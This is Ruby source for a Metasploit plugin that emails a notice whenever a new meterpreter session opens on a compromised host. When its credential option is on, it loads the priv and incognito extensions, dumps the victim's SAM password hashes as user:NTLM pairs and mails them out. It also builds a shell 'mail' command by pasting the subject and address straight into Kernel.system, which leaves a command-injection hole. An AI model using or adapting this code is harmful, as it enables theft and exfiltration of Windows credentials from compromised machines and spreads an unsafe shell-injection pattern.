require 'tempfile'

module Msf
   class Plugin::Email < Msf::Plugin
      attr_accessor :email_address, :tmp_file, :include_creds, :send_startup

      include Msf::SessionEvent

      def collect_credentials(session)
         print_status("Collecting credentials for email")
         report = ""

         if (session.type == "meterpreter")
	         session.core.use("priv")
            session.core.use("incognito")

	         session.priv.sam_hashes.each do |hash|
	            report << "#{hash.user_name}:#{hash.ntlm}\n"
	         end
	      end

	      return report
      end

      def send_email(msg, subject)
         begin
            tmp_file = Tempfile.open('msf_email')
            tmp_file.write(msg)
            tmp_file.close

            Kernel.system("cat #{tmp_file.path} | mail -s '#{subject}' #{self.email_address}")

         rescue Exception => e
            print_error("Sending email notification: #{e.to_s}")
         ensure
            tmp_file.delete
         end
      end

      def on_plugin_load
         if self.send_startup
            send_email("Metasploit email notification enabled", "Metasploit started")
         end

	      print_status("Email notification enabled")
      end

      def on_session_open(session)
         subject = "New meterpreter session"
         msg = "#{session.tunnel_to_s} via #{session.via_exploit}"

         if self.include_creds
            msg << "\n\nUser hashes:\n#{collect_credentials(session)}\n"
         end

         send_email(msg, subject)
      end

      def initialize(framework, opts)
         super

         self.email_address = "user@domain"
         self.include_creds = false
         self.send_startup = true
         self.framework.events.add_session_subscriber(self)
         self.on_plugin_load

      end

      def cleanup
         self.framework.events.remove_session_subscriber(self)
      end

      def name
         "email notification"
      end

      def desc
         "Send email notifications for any new session"
      end

   end
end
